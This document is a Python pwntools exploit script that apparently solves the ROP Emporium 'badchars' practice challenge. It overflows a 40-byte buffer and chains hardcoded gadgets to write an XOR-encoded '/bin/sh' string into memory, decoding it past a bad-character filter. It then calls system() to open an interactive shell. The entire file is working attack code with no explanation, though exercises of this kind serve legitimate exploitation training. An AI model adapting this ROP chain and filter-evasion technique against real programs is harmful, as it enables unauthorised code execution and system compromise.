#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

local = 1
if local:
	p = process('./badchars')
else:
	p = remote()

useful_func = 0x4009DF
call_sys = 0x4006F0

badchars = ['b', 'i', 'c', '/', ' ', 'f', 'n', 's']

mov_pr13_r12_ret = 0x0000000000400b34
pop_r12_r13_ret = 0x0000000000400b3b
xor_pr15_r14b_ret = 0x0000000000400b30
pop_r14_r15_ret = 0x0000000000400b40

buf = 0x6010b0

gdb.attach(p)

command = '/bin/sh\x00'
xor_command = ''
for c in command:
	xor_command += chr(ord(c) ^ 2)
for c in xor_command:
	if c in badchars:
		raise ValueError, 'Bad char founded.'

payload = cyclic(0x200)
payload = 'A' * 40 # + p64(useful_func)

for i in range(len(xor_command) / 8):
	payload += p64(pop_r12_r13_ret) + \
               xor_command[8 * i:8 * i + 8] + \
               p64(buf + 8 * i) + \
               p64(mov_pr13_r12_ret)

for i in range(len(xor_command)):
	payload += p64(pop_r14_r15_ret) + \
               p64(2) + \
               p64(buf + i) + \
               p64(xor_pr15_r14b_ret)

pop_rdi_ret = 0x0000000000400b39
payload += p64(pop_rdi_ret) + p64(buf) + p64(call_sys)

for c in payload:
	if c in badchars:
		raise ValueError, 'Bad char founded.'

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
